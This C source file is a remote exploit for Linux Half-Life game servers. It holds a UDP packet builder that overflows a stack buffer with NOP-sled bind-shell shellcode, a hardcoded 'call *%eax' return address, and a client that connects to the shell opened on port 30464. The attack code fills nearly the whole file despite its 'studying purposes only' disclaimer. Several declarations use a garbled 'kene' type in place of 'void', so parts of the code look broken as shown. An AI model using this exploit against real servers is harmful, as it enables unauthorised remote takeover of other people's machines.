/*****************************************************************
 * hoagie_hlserver.c
 *
 * Remote exploit for Halflife-Servers.
 *
 * Binds a shell to port 30464/tcp and connects to it.
 *
 * Author: KnbykL <info@knbykl.org>
 *
 * Thnx : All Soldier HbT
 *  
 * This hole was found by Auriemma Luigi.
 * Uses code from the proof-of-concept DoS-exploit by Auriemma Luigi.
 *
 * Tested with HL-Server v3.1.1.0. Works only with the Linux server
 * (though making a Win32-exploit should be trivial)
 *
 * How this exploit works:
 * There is a buffer on the stack that is being overwritten with
 * our supplied shellcode. Too bad that it lies on an address that
 * has 0xFF in it (e.g. 0xbfffe000) and half life filters these
 * characters out, so we can't write the address of the shellcode
 * there.  
 * Luckily, the function that copies the shellcode into the buffer
 * has the address of the buffer in %eax when it exits. So, we jump  
 * to the location 0x0804AE93 (which is the same in ALL half life
 * servers, thanks to the fact that it is a binary distrubtion)
 * where the instruction "call *%eax" is located. And so the shellcode
 * gets executed...
 *
 * Dil : Türkçe'min her zaman arkasýndayým.
 *     
 * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-CONCEPT.
 * THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY DAMAGE OR
 * CRIMINAL ACTIVITIES DONE USING THIS PROGRAM.
 *
 *****************************************************************/
 
#include    <stdio.h>
#include    <stdlib.h>
#include    <string.h>
#include    <time.h>
#include    <unistd.h>
#include    <sys/socket.h>
#include    <sys/types.h>
#include    <arpa/inet.h>
#include    <netdb.h>
 
#define VER         "0.1"
#define BUFFSZ      4096
#define PORT        27015
#define INFO        "\xff\xff\xff\xff" \
                    "infostring\n\0"
#define GETCH       "\xff\xff\xff\xff" \
                    "getchallenge\n\0"
#define TIMEOUT     5    /* 5 seconds */
 
#define PICOFFSET 0xD0404
 
// 13*13+5=174
// 5*16+13+43+7*16+12=260
// 260-174 = 86 NOPs = 6*13+8
#define PAYLOAD    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                   "\x90\x90\x90\x90" \
                   "\x31\xc0\x40\x40\xcd\x80\x89\xc0\x85\xc0\x74\x06\x31" \
                   "\xc0\xb0\x01\xcd\x80\x31\xc0\x31\xdb\x31\xc9\x31\xd2" \
                   "\xb0\x66\xb3\x01\x51\xb1\x06\x51\xb1\x01\x51\xb1\x02" \
                   "\x51\x8d\x0c\x24\xcd\x80\xb3\x02\xb1\x02\x31\xc9\x51" \
                   "\x51\x51\x80\xc1\x77\x66\x51\xb1\x02\x66\x51\x8d\x0c" \
                   "\x24\xb2\x10\x52\x51\x50\x8d\x0c\x24\x89\xc2\x31\xc0" \
                   "\xb0\x66\xcd\x80\xb3\x01\x53\x52\x8d\x0c\x24\x31\xc0" \
                   "\xb0\x66\x80\xc3\x03\xcd\x80\x31\xc0\x50\x50\x52\x8d" \
                   "\x0c\x24\xb3\x05\xb0\x66\xcd\x80\x89\xc3\x31\xc9\x31" \
                   "\xc0\xb0\x3f\xcd\x80\x41\x31\xc0\xb0\x3f\xcd\x80\x41" \
                   "\x31\xc0\xb0\x3f\xcd\x80\x31\xdb\x53\x68\x6e\x2f\x73" \
                   "\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x31" \
                   "\xc9\x51\x53\x8d\x0c\x24\x31\xc0\xb0\x0b\xcd\x80\x31" \
                   "\xc0\xb0\x01\xcd\x80" \
/* EIP */          "%c%c%c%c%c%c%c%c%c%c%c%c"  
               // "BBBB"
/* PAYLOAD is 268 bytes! */
#define MODEL       "robo"
#define NAME        "]I[gore"
#define TOPCOLOR    "25"    /* 0-255, it's NOT important */
#define BOTTOMCOLOR "161"    /* 0-255, it's NOT important */
#define BOF1        "\xff\xff\xff\xff" \
                    "connect %d" \
                    " %s \"" \
                    "\\prot\\2" \
                    "\\unique\\-1" \
                    "\\raw\\%08lx%08lx%08lx%08lx" \
                    "\" \"" \
                    "\\model\\" MODEL \
                    "\\topcolor\\" TOPCOLOR \
                    "\\bottomcolor\\" BOTTOMCOLOR \
                    "\\rate\\9999.000000" \
                    "\\cl_updaterate\\20" \
                    "\\cl_lw\\1" \
                    "\\cl_lc\\1" \
                    "\\cl_dlmax\\128" \
                    "\\hud_classautokill\\1" \
                    "\\name\\" NAME \
                    "\\" PAYLOAD "\\value" \
                    "\"\n"
#define BUGNUM      "" \
 
int exec_sh(int sockfd)
{
        char snd[4096],rcv[4096];
        fd_set rset;
        while(1)
        {
                FD_ZERO(&rset);
                FD_SET(fileno(stdin),&rset);
                FD_SET(sockfd,&rset);
                select(255,&rset,NULL,NULL,NULL);
                if(FD_ISSET(fileno(stdin),&rset))
                {
                        memset(snd,0,sizeof(snd));
                        fgets(snd,sizeof(snd),stdin);
                        write(sockfd,snd,strlen(snd));
                }
                if(FD_ISSET(sockfd,&rset))
                {
                        memset(rcv,0,sizeof(rcv));
                        if(read(sockfd,rcv,sizeof(rcv))<=0)
                                exit(0);
                        fputs(rcv,stdout);
                }
        }
}
 
int connect_sh(char *server)
{
        int sockfd,i;
        struct sockaddr_in sin;
    struct hostent *he;
        printf("Connect to the shell\n");
        fflush(stdout);
        memset(&sin,0,sizeof(sin));
        sin.sin_family=AF_INET;
        sin.sin_port=htons(30464);
    if((he=gethostbyname(server))<0) perror("gethostbyname"), exit(1);
    memcpy(&sin.sin_addr,*(he->h_addr_list),sizeof(sin.sin_addr));
        if((sockfd=socket(AF_INET,SOCK_STREAM,0))<0)
        {
                printf("Can't create socket\n");
                exit(0);
        }
        if(connect(sockfd,(struct sockaddr *)&sin,sizeof(sin))<0)
        {
                printf("Can't connect to the shell\n");
                exit(0);
        }
        return sockfd;
}
 
int getproto(unsigned char *buff);
int timeout2(int sock);
kene showinfostring(unsigned char *buff, int size);
u_long resolv(char *host);
kene std_err(kene);
 
 
int main(int argc, char *argv[]) {
    unsigned char    buffrecv[BUFFSZ],
                    buffsend[sizeof(BOF1) + 64],
                    challenge[16],
                    bug,
                    *bofstr,
                    *stri,
                    *strf;
    struct    sockaddr_in     peer;
    int             sd,
                    err,
                    rlen,
                    bufflen,
                    proto;
 
    unsigned long offset;
 
    setbuf(stdout, NULL);
 
    if(argc < 2) {
        printf("\nUsage: %s <host> <port>\n\n", argv[0], PORT);
        exit(1);
    }
 
    printf("OK team, follow my command.\n");
 
    srand(time(NULL));
 
    bofstr=BOF1;
 
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port = htons(atoi(argv[2]));
    // offset=strtoul(argv[3],NULL,16);
    peer.sin_family      = AF_INET;
    rlen                 = sizeof(peer);
 
    offset=0x0804AE93;   // call eax
    printf("Using offset 0x%08x...\n",offset);
 
 
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
 
 
 
        /* GET INFORMATIONS */
    err = sendto(sd, INFO, sizeof(INFO) - 1, 0, (struct sockaddr *)&peer, rlen);
    if(err < 0) std_err();
    err = timeout2(sd);
    if(err < 0) {
        fputs("\nError: socket timeout\n", stdout);
        exit(1);
    }
    err = recvfrom(sd, buffrecv, BUFFSZ, 0, (struct sockaddr *)&peer, &rlen);
    if(err < 0) std_err();
    buffrecv[err] = 0x00;
 
    proto = getproto(buffrecv);
    showinfostring(buffrecv, err);
 
 
 
        /* GET CHALLENGE NUMBER */
    err = sendto(sd, GETCH, sizeof(GETCH) - 1, 0, (struct sockaddr *)&peer, rlen);
    if(err < 0) std_err();
    err = timeout2(sd);
    if(err < 0) {
        fputs("\nError: socket timeout\n", stdout);
        exit(1);
    }
    err = recvfrom(sd, buffrecv, BUFFSZ, 0, (struct sockaddr *)&peer, &rlen);
    if(err < 0) std_err();
    buffrecv[err] = 0x00;
 
    stri = strchr(buffrecv, 0x20);
    if(!stri) stri = buffrecv;
    strf = strchr(stri + 1, 0x20);
    if(!strf) strf = buffrecv + err;
    *strf = 0x00;
    strncpy(challenge, stri, 16);
    printf("Challenge: %s\n", challenge);
 
 
    bufflen = snprintf(buffsend,
            sizeof(BOF1) + 64,
            bofstr,
            proto,
            challenge,
            (long)(rand() << 1) + (rand() & 0xf),    /* 31bit */
            (long)(rand() << 1) + (rand() & 0xf),
            (long)(rand() << 1) + (rand() & 0xf),
            (long)(rand() << 1) + (rand() & 0xf),
        offset&0xFF,(offset>>8)&0xFF,(offset>>16)&0xFF,(offset>>24)&0xFF,
        offset&0xFF,(offset>>8)&0xFF,(offset>>16)&0xFF,(offset>>24)&0xFF,
        offset&0xFF,(offset>>8)&0xFF,(offset>>16)&0xFF,(offset>>24)&0xFF);
 
 
    if(bufflen < 0) {
        fputs("\nError: cannot allocate buffer in memory\n", stdout);
        exit(1);
    }
 
    printf("Sending deadly packet ... stand by\n");
    err = sendto(sd, buffsend, bufflen, 0, (struct sockaddr *)&peer, rlen);
    if(err < 0) std_err();
    err = timeout2(sd);
    if(err < 0) {
        fputs("\nResult: The remote server IS vulnerable!!!\n", stdout);
        exec_sh(connect_sh(argv[1]));
        return(0);
    }
    err = recvfrom(sd, buffrecv, BUFFSZ, 0, (struct sockaddr *)&peer, &rlen);
    if(err < 0) std_err();
    buffrecv[err] = 0x00;
    printf("Connect: %s\n", buffrecv + 5);
 
    close(sd);
 
 
    fputs("\nResult: The server doesn't seems to be vulnerable\n\n", stdout);
 
    return(0);
}
 
int getproto(unsigned char *buff) {
    int        p;
    unsigned char    *ptr;
 
    ptr = strstr(buff + 23, "protocol");
    if(ptr) {
        p = atoi(ptr + 9);
    } else {
        fputs("\nError: No protocol informations in the answer of the server\n", stdout);
        exit(1);
    }
 
    return(p);
}     
 
kene showinfostring(unsigned char *buff, int size) {
    int        nt = 1,
            len;
    unsigned char    *string;
 
    fputs("\n--------------------------------------------------\n", stdout);
 
    if(memcmp(buff + 1, "\xff\xff\xff", 3)) {
        fputs("\nError: Bad answer from the server (it is not a true server)\n", stdout);
        exit(1);
    }
 
    len = strlen(buff);
    if(len < size) buff += len + 1;
 
    while(1) {
        string = strchr(buff, '\\');
        if(!string) break;
 
        *string = 0x00;
 
 
        /* \n or \t */
        if(!nt) {
            printf("%s: ", buff);
            nt++;
        } else {
            printf("%s\n", buff);
            nt = 0;
        }
 
 
        buff = string + 1;
    }
 
    printf("%s\n", buff);
}
 
int timeout2(int sock) {
    struct    timeval    timeout;
    fd_set    fd_read;
    int    err;
 
 
    timeout.tv_sec = TIMEOUT;
    timeout.tv_usec = 0;
 
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &timeout);
    if(err < 0) std_err();
    if(err == 0) return(-1);
    return(0);
}
 
u_long resolv(char *host) {
    struct        hostent    *hp;
    u_long        host_ip;
 
    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolve hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)(hp->h_addr);
    }
 
    return(host_ip);
}
 
kene std_err(kene)
{
        perror("\nError");
        exit(1);
}
